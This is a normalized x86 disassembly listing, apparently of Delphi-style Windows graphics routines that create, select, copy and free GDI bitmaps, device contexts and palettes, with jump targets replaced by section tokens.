call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_426737
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42671a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407dd8
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426721
mov al 0x1
sub_426750
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41afdc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426798
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42679f
mov eax [ ebp - 0x4 ]
call sub_403154
retn
sub_4267a4
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_4267d8
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41afdc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426823
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42682a
mov eax [ ebp - 0x4 ]
call sub_403154
retn
sub_4268ec
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_418974
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42698a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426991
mov eax [ rw-data ]
call sub_4189d8
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_426962
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_426a7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_424eb0
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4185b0
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_424e54
test al al
je r-xdata
sub_426998
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418974
mov esi eax
xor ecx ecx
push ebp
push sub_426a08
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4189d8
retn
mov edx ebx
mov eax esi
call sub_4185b0
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_426a7c
sub_426a14
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_424944
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_426a50
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax esi
call sub_426a7c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424a08
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_426a7c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_424c0c
xor edx edx
push ebp
push sub_426b10
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_425038
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_418988
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_424eb0
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_426b1c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_424c0c
xor eax eax
push ebp
push sub_426bfb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_427e38
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_426998
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_427f38
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_425038
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4188ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_424eb0
retn
sub_426c0c
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_403154
sub_426c2c
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_426998
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40d130
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_426c88
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_423298
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_426998
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_426998
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_426cd4
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_425b38
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_426d83
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_426d90
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_426ddc
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_426998
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_4253a4
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_4253a4
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_42742a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026dc
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_427134
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_425290
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_4253a4
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_4253a4
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_4253a4
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_4253a4
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4273db
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4273ca
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4273a8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_4253a4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_426d90
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028d8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_425b38
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424828
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_416f24
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423b68
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_4247ec
call sub_423b68
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_4252fc
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4273af
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_4253a4
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_42737e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_4253a4
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_4026fc
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423b68
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_4247ec
call sub_423b68
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423b68
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_4247ec
call sub_423b68
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_4253a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_4039b4
call sub_4039b4
jmp r-xdata
sub_4273d1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_4273e0
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_403930
call sub_403984
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_427440
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_4274a4
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_426998
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42769f
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_4253a4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_4253a4
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_4253a4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_427657
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_426ddc
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_4276b0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_42650c
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_426c08
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_427718
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax esi
call sub_427e28
mov eax [ esi + 0x28 ]
call sub_426c0c
mov eax [ esi + 0x2c ]
call sub_403154
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418b80
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_427754
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
